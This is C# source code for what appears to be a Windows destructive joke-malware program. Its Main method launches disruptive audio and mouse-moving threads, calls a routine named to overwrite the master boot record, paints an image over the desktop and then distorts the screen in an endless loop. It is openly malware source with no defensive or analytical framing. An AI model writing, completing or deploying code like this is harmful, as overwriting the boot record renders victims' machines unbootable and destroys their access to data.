using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;

class GDI
{
    [DllImport("user32.dll")]
    static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")]
    static extern IntPtr GetWindowDC(IntPtr hwnd);
    [DllImport("user32.dll")]
    static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("user32.dll")]
    static extern bool GetWindowRect(IntPtr hWnd, ref RECT rect);
    [DllImport("gdi32.dll")]
    static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);
    [StructLayout(LayoutKind.Sequential)]
    public struct RECT
    {
        public int left;
        public int top;
        public int right;
        public int bottom;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int x;
        public int y;
    }
    static void Main()
    {
        Thread soundThread = new Thread(() => ByteBeat.PlayBytebeatAudio());
        Thread MouseMoverThread = new Thread(() => MouseMover.Mover());
        MouseMoverThread.Start();
        soundThread.Start();
        MBR.OverwriteMbr();
        Image image;
        try
        {
            image = Freemasonry.Properties.Resources.Knuckles;
        }
        catch (Exception)
        {
            return;
        }
        int screenWidth = GetSystemMetrics(0);
        int screenHeight = GetSystemMetrics(1);
        int x = (screenWidth - image.Width) / 2;
        int y = (screenHeight - image.Height) / 2;
        IntPtr hWnd;
        IntPtr hDsktp;
        RECT wRect = new RECT();
        int counter = 30;
        hWnd = GetDesktopWindow();
        hDsktp = GetDC(IntPtr.Zero);
        using (Graphics g = Graphics.FromHdc(hDsktp))
        {
            g.DrawImage(image, x, y, image.Width, image.Height);
        }
        ReleaseDC(IntPtr.Zero, hDsktp);
        while (true)
        {
            hWnd = GetDesktopWindow();
            hDsktp = GetDC(IntPtr.Zero);
            GetWindowRect(hWnd, ref wRect);
            POINT[] lppoint = new POINT[3];
            lppoint[0].x = wRect.left + counter;
            lppoint[0].y = wRect.top - counter;
            lppoint[1].x = wRect.right + counter;
            lppoint[1].y = wRect.top + counter;
            lppoint[2].x = wRect.left - counter;
            lppoint[2].y = wRect.bottom - counter;
            PlgBlt(hDsktp, lppoint, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, IntPtr.Zero, 0, 0);
            if (counter < 15) counter++;
            if (counter < 65) counter--;
            ReleaseDC(IntPtr.Zero, hDsktp);
        }
    }
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);
}